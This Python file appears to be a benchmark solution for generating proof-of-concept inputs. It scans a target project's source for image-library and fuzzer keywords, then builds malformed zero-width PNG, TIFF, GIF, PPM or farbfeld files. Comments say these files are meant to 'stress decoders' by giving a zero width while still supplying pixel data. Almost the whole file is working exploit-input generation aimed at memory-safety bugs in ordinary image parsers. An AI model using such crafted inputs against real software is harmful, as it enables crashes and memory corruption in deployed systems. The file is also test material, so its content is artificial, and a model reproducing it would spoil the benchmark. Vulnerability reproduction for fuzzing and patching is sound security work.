import os
import re
import io
import struct
import tarfile
import tempfile
import zlib
from typing import Dict, Iterable, Tuple, Optional


def _read_text_snippet_from_file(path: str, limit: int = 262144) -> str:
    try:
        with open(path, "rb") as f:
            data = f.read(limit)
        return data.decode("utf-8", errors="ignore").lower()
    except Exception:
        return ""


def _read_text_snippet_from_tar_member(t: tarfile.TarFile, m: tarfile.TarInfo, limit: int = 262144) -> str:
    try:
        f = t.extractfile(m)
        if f is None:
            return ""
        data = f.read(limit)
        return data.decode("utf-8", errors="ignore").lower()
    except Exception:
        return ""


def _png_chunk(typ: bytes, data: bytes) -> bytes:
    crc = zlib.crc32(typ)
    crc = zlib.crc32(data, crc) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + typ + data + struct.pack(">I", crc)


def _make_png_zero_width(height: int = 64) -> bytes:
    height = max(1, int(height))
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">I", 0) + struct.pack(">I", height) + bytes([8, 2, 0, 0, 0])
    # For width=0, rowbytes=0, each scanline still has 1 filter byte => decompressed size == height
    raw = b"\x00" * height
    idat = zlib.compress(raw, 9)
    return sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", idat) + _png_chunk(b"IEND", b"")


def _make_tiff_zero_width(height: int = 1, bytecount: int = 32) -> bytes:
    height = max(1, int(height))
    bytecount = max(1, int(bytecount))

    # Little-endian TIFF
    header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)

    entries = []
    # (tag, type, count, value_or_offset)
    # types: 3=SHORT, 4=LONG
    entries.append((256, 4, 1, 0))          # ImageWidth = 0
    entries.append((257, 4, 1, height))     # ImageLength
    entries.append((258, 3, 1, 8))          # BitsPerSample = 8
    entries.append((259, 3, 1, 1))          # Compression = none
    entries.append((262, 3, 1, 2))          # PhotometricInterpretation = RGB
    entries.append((277, 3, 1, 3))          # SamplesPerPixel = 3
    entries.append((278, 4, 1, height))     # RowsPerStrip
    entries.append((279, 4, 1, bytecount))  # StripByteCounts (non-zero)
    entries.append((284, 3, 1, 1))          # PlanarConfiguration = chunky

    entries.sort(key=lambda x: x[0])

    n = len(entries) + 1  # + StripOffsets
    ifd_size = 2 + n * 12 + 4
    data_offset = 8 + ifd_size

    entries.append((273, 4, 1, data_offset))  # StripOffsets
    entries.sort(key=lambda x: x[0])

    ifd = struct.pack("<H", len(entries))
    for tag, typ, count, val in entries:
        if typ == 3 and count == 1:
            value_field = struct.pack("<H", val & 0xFFFF) + b"\x00\x00"
        else:
            value_field = struct.pack("<I", val & 0xFFFFFFFF)
        ifd += struct.pack("<H", tag) + struct.pack("<H", typ) + struct.pack("<I", count) + value_field
    ifd += struct.pack("<I", 0)  # next IFD offset

    pixel = b"\x00" * bytecount
    return header + ifd + pixel


def _gif_pack_lzw_codes(codes: Iterable[int], min_code_size: int) -> bytes:
    # GIF LZW: codes packed LSB-first, starting code size = min_code_size + 1
    code_size = min_code_size + 1
    bitbuf = 0
    bitcount = 0
    out = bytearray()
    for c in codes:
        bitbuf |= (c & ((1 << code_size) - 1)) << bitcount
        bitcount += code_size
        while bitcount >= 8:
            out.append(bitbuf & 0xFF)
            bitbuf >>= 8
            bitcount -= 8
    if bitcount:
        out.append(bitbuf & 0xFF)
    return bytes(out)


def _make_gif_zero_width(height: int = 1) -> bytes:
    height = max(1, int(height))

    header = b"GIF89a"
    # Logical Screen Descriptor: width=0, height=1, GCT flag set, size=2 colors
    lsd = struct.pack("<HHBBB", 0, 1, 0x80 | 0x00, 0, 0)
    gct = b"\x00\x00\x00\xff\xff\xff"

    # Image Descriptor: width=0, height=height
    img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, 0, height, 0)
    min_code_size = 2
    clear = 1 << min_code_size
    end = clear + 1

    # Minimal stream: clear, end
    lzw = _gif_pack_lzw_codes([clear, end], min_code_size)
    # Sub-block(s)
    if len(lzw) == 0:
        blocks = b"\x00"
    else:
        blocks = bytes([len(lzw)]) + lzw + b"\x00"

    trailer = b"\x3B"
    return header + lsd + gct + img_desc + bytes([min_code_size]) + blocks + trailer


def _make_ppm_zero_width() -> bytes:
    # P6 binary PPM with width=0 height=1; include 3 bytes to stress decoders that still read pixel data.
    return b"P6\n0 1\n255\n" + b"\x00\x00\x00"


def _make_farbfeld_zero_width() -> bytes:
    # farbfeld: 8-byte magic + width+height (u32be) + pixel data (8 bytes per pixel)
    # width=0 height=1 but include a pixel to stress decoders.
    return b"farbfeld" + struct.pack(">II", 0, 1) + (b"\x00" * 8)


def _detect_format_from_source(src_path: str) -> str:
    scores: Dict[str, int] = {
        "png": 0,
        "tiff": 0,
        "gif": 0,
        "jpeg": 0,
        "webp": 0,
        "bmp": 0,
        "pnm": 0,
        "farbfeld": 0,
    }

    fmt_keywords: Dict[str, Tuple[str, ...]] = {
        "png": ("png", "ihdr", "idat", "iout", "spng_", "libpng", "lodepng", "stb_image"),
        "tiff": ("tiff", "tiffio", "libtiff", "tif_"),
        "gif": ("gif", "giflib", "dgif", "egif", "gif_lib.h"),
        "jpeg": ("jpeg", "jpeglib", "libjpeg", "tjinit", "turbojpeg"),
        "webp": ("webp", "vp8", "vp8l", "vp8x"),
        "bmp": ("bmp", "bitmap", "dib", "bitmapinfoheader"),
        "pnm": ("pnm", "ppm", "pgm", "pbm", "pam", "p6\n", "p5\n"),
        "farbfeld": ("farbfeld",),
    }

    code_exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".rs", ".py", ".go", ".java")
    max_member_size = 2 * 1024 * 1024

    def bump_by_name(name_l: str) -> None:
        for fmt, kws in fmt_keywords.items():
            for kw in kws:
                if kw in name_l:
                    scores[fmt] += 3

    def bump_by_text(txt: str) -> None:
        if not txt:
            return
        for fmt, kws in fmt_keywords.items():
            inc = 0
            for kw in kws:
                if kw and kw in txt:
                    inc += txt.count(kw)
            if inc:
                scores[fmt] += inc

        # Fuzzer entrypoint suggests OSS-Fuzz usage; just a hint for image parsing.
        if "llvmfuzzertestoneinput" in txt:
            scores["png"] += 1
            scores["tiff"] += 1
            scores["gif"] += 1
            scores["jpeg"] += 1
            scores["webp"] += 1
            scores["bmp"] += 1
            scores["pnm"] += 1
            scores["farbfeld"] += 1

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                name_l = fn.lower()
                bump_by_name(name_l)
                if name_l.endswith(code_exts):
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                        if st.st_size > max_member_size:
                            continue
                    except Exception:
                        continue
                    bump_by_text(_read_text_snippet_from_file(p))
    else:
        try:
            with tarfile.open(src_path, "r:*") as t:
                for m in t.getmembers():
                    name_l = m.name.lower()
                    bump_by_name(name_l)
                    if not m.isreg():
                        continue
                    if m.size > max_member_size:
                        continue
                    if name_l.endswith(code_exts) or "fuzz" in name_l or "fuzzer" in name_l:
                        bump_by_text(_read_text_snippet_from_tar_member(t, m))
        except Exception:
            return "png"

    # Tie-breaking preference: png > tiff > gif > pnm > farbfeld > jpeg > webp > bmp
    order = ["png", "tiff", "gif", "pnm", "farbfeld", "jpeg", "webp", "bmp"]
    best = order[0]
    best_score = scores.get(best, 0)
    for fmt in order[1:]:
        sc = scores.get(fmt, 0)
        if sc > best_score:
            best = fmt
            best_score = sc

    return best if best_score > 0 else "png"


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _detect_format_from_source(src_path)

        if fmt == "tiff":
            return _make_tiff_zero_width(height=1, bytecount=64)
        if fmt == "gif":
            return _make_gif_zero_width(height=64)
        if fmt == "pnm":
            return _make_ppm_zero_width()
        if fmt == "farbfeld":
            return _make_farbfeld_zero_width()
        # default to PNG
        return _make_png_zero_width(height=1024)